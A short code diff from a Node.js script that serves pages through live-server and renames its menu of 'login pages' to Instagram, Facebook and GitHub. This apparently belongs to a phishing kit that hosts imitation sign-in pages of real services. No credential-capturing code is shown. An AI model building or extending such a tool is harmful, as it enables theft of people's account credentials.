@@ -16,9 +16,9 @@ spawn("npx", ["live-server", "--port=5500", "--no-browser"], { stdio: "inherit",
 
 function showMenu() {
     console.log("\nSelect a login page:");
-    console.log("1. Login Page 1");
-    console.log("2. Login Page 2");
-    console.log("3. Login Page 3");
+    console.log("1. Instagram");
+    console.log("2. Facebook");
+    console.log("3. GitHub");
     console.log("4. Exit");
 
     rl.question("Enter your choice (1-4): ", async (choice) => {
